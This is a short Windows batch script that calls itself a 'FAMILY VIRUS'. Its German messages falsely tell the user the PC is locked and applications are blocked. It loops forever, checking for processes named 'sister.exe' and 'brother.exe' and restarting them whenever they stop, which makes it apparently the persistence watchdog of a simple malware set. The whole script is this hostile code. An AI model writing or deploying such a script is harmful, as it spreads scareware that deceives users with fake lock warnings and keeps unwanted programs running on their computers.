@echo off
title SS-Parents
color f
:review
color AB
cd "C:\users\%username%\system\"
cls
echo *************** Parents ***************
color C2
echo.
echo - FAMILY VIRUS ACTIV
color 1
echo Dieser PC wurde gesperrt!
color 2A
echo Bestimmte Anwendungen werden blockiert. 
color B
echo.
tasklist 2>nul | find /I /N "sister.exe"2>nul
color C
if "%ERRORLEVEL%"=="1" start "cmd.exe" "sister.exe" >nul
color ca
tasklist 2>nul | find /I /N "brother.exe"2>nul
color ac
if "%ERRORLEVEL%"=="1" start "cmd.exe" "brother.exe" >nul
goto review